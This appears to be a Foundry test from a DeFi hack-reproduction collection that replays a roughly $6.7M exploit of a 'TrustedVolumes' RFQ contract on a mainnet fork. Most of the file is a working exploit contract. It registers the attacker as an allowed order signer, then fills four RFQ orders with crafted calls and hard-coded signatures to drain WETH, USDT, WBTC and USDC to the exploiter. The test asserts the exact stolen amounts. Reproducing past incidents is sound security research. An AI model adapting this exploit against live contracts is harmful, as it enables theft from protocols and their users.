// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";
// @KeyInfo - Total Lost : ~$6.7M
// Attacker : https://etherscan.io/address/0xC3EBDdEa4f69df717a8f5c89e7cF20C1c0389100
// Attack Contract : https://etherscan.io/address/0xD4D5DB5EC65272B26F756712247281515F211E95
// Vulnerable Contract : https://etherscan.io/address/0xeEeEEe53033F7227d488ae83a27Bc9A9D5051756
// Attack Tx : https://etherscan.io/tx/0xc5c61b3ac39d854773b9dc34bd0cdbc8b5bbf75f18551802a0b5881fcb990513
//
// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0xeEeEEe53033F7227d488ae83a27Bc9A9D5051756#code
//
// @Analysis
// Post-mortem : https://x.com/trustedvolumes/status/2052235435292910005
// Hacking God : https://www.quillaudits.com/blog/hack-analysis/trustedvolumes-rfq-hack

contract TrustedVolumesTest is Test {
    bytes32 internal constant TX_HASH = 0xc5c61b3ac39d854773b9dc34bd0cdbc8b5bbf75f18551802a0b5881fcb990513;
    address internal constant EXPLOITER = 0xC3EBDdEa4f69df717a8f5c89e7cF20C1c0389100;
    address internal constant EXPLOIT_CONTRACT = 0xD4D5DB5EC65272B26F756712247281515F211E95;
    IERC20 internal constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 internal constant USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 internal constant WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);

    function setUp() public {
        vm.createSelectFork("mainnet", TX_HASH);
        vm.label(EXPLOITER, "Exploiter");
        vm.label(address(USDC), "USDC");
        vm.label(address(USDT), "USDT");
        vm.label(address(WBTC), "WBTC");
    }

    function testExploit() public {
        uint256 beforeUsdt = USDT.balanceOf(EXPLOITER);
        uint256 beforeWbtc = WBTC.balanceOf(EXPLOITER);
        uint256 beforeUsdc = USDC.balanceOf(EXPLOITER);
        uint256 beforeEth = EXPLOITER.balance;

        vm.prank(EXPLOITER, EXPLOITER);
        new TrustedVolumesExploit(EXPLOITER);

        uint256 stolenUsdt = USDT.balanceOf(EXPLOITER) - beforeUsdt;
        uint256 stolenWbtc = WBTC.balanceOf(EXPLOITER) - beforeWbtc;
        uint256 stolenUsdc = USDC.balanceOf(EXPLOITER) - beforeUsdc;
        uint256 stolenEth = EXPLOITER.balance - beforeEth;

        assertEq(stolenUsdt, 206_282_446_876);
        assertEq(stolenWbtc, 1_693_910_519);
        assertEq(stolenUsdc, 1_268_771_488_875);
        assertEq(stolenEth, 1_291_161_105_215_879_179_270);

        console.log("Stolen USDT", stolenUsdt);
        console.log("Stolen WBTC", stolenWbtc);
        console.log("Stolen USDC", stolenUsdc);
        console.log("Stolen ETH", stolenEth);
    }
}

contract TrustedVolumesExploit {
    bytes4 internal constant FILL_ORDER_SELECTOR = 0x4112e1c2;
    ITrustedVolumesRFQ internal constant RFQ = ITrustedVolumesRFQ(0xeEeEEe53033F7227d488ae83a27Bc9A9D5051756);
    address internal constant RESOLVER = 0x9bA0CF1588E1DFA905eC948F7FE5104dD40EDa31;
    ITrustedVolumesWETH internal constant WETH = ITrustedVolumesWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 internal constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    ITrustedVolumesUSDT internal constant USDT = ITrustedVolumesUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 internal constant WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);

    constructor(address exploiter) {
        RFQ.registerAllowedOrderSigner(exploiter, true);
        USDC.transferFrom(exploiter, address(this), 4);
        USDC.approve(address(RFQ), 4);

        (bool success,) = address(RFQ)
            .call(
                abi.encodeWithSelector(
                    FILL_ORDER_SELECTOR,
                    address(USDC),
                    address(WETH),
                    1,
                    1_291_161_105_215_879_179_270,
                    address(this),
                    RESOLVER,
                    1778114888,
                    uint256(1),
                    uint8(27),
                    bytes32(0x4f6496eb7ebd74e91df255d580b631e48513f271c60994253411dcf2e1aeb4c0),
                    bytes32(0x0b1ad0f7ff67e96997d22b14aa0908b147b6b71bf76c3ef3f41a9c3a35eda691),
                    2
                )
            );
        require(success, "WETH order fill failed");

        (success,) = address(RFQ)
            .call(
                abi.encodeWithSelector(
                    FILL_ORDER_SELECTOR,
                    address(USDC),
                    address(USDT),
                    1,
                    206_282_446_876,
                    address(this),
                    RESOLVER,
                    1778114888,
                    uint256(2),
                    uint8(28),
                    bytes32(0x957d7e01305f29e1b3c38169aa877e2e3d7250a25363231074f027462cebb0c2),
                    bytes32(0x43ee738d4a0abe1f96b78c82cefe32af7ba4ad064f270dd0bf417f33726f4bb8),
                    2
                )
            );
        require(success, "USDT order fill failed");

        (success,) = address(RFQ)
            .call(
                abi.encodeWithSelector(
                    FILL_ORDER_SELECTOR,
                    address(USDC),
                    address(WBTC),
                    1,
                    1_693_910_519,
                    address(this),
                    RESOLVER,
                    1778114888,
                    uint256(3),
                    uint8(28),
                    bytes32(0x39a0cb78995ca12d4999f1594e6fd0cc4c8ad9db63f268c38a6f5297806927c9),
                    bytes32(0x04190fdbb1d3a4aa8d58b5125ff293aa8888a9d7891b94dfcecd4500b27b9d27),
                    2
                )
            );
        require(success, "WBTC order fill failed");

        (success,) = address(RFQ)
            .call(
                abi.encodeWithSelector(
                    FILL_ORDER_SELECTOR,
                    address(USDC),
                    address(USDC),
                    1,
                    1_268_771_488_879,
                    address(this),
                    RESOLVER,
                    1778114888,
                    uint256(4),
                    uint8(27),
                    bytes32(0x4a4632981a75d969b349af56527c32e7c153c9e3a0ab6f2342b9ffab6fe099ba),
                    bytes32(0x2bcba1cc93023924b884ed8855cb015a87b69010ed217f98e3c2043328451923),
                    2
                )
            );
        require(success, "USDC order fill failed");
        uint256 wethBalance = WETH.balanceOf(address(this));
        WETH.withdraw(wethBalance);
        WETH.balanceOf(address(this));

        uint256 usdtBalance = USDT.balanceOf(address(this));
        USDT.transfer(exploiter, usdtBalance);
        WBTC.transfer(exploiter, WBTC.balanceOf(address(this)));
        USDC.transfer(exploiter, USDC.balanceOf(address(this)));
        (bool ethSent,) = payable(exploiter).call{value: address(this).balance}("");
        require(ethSent, "ETH transfer failed");
    }

    receive() external payable {}
}


interface ITrustedVolumesRFQ {
    function registerAllowedOrderSigner(address signer, bool allowed) external;
}

interface ITrustedVolumesUSDT {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external;
}

interface ITrustedVolumesWETH is IERC20 {
    function withdraw(uint256 wad) external;
}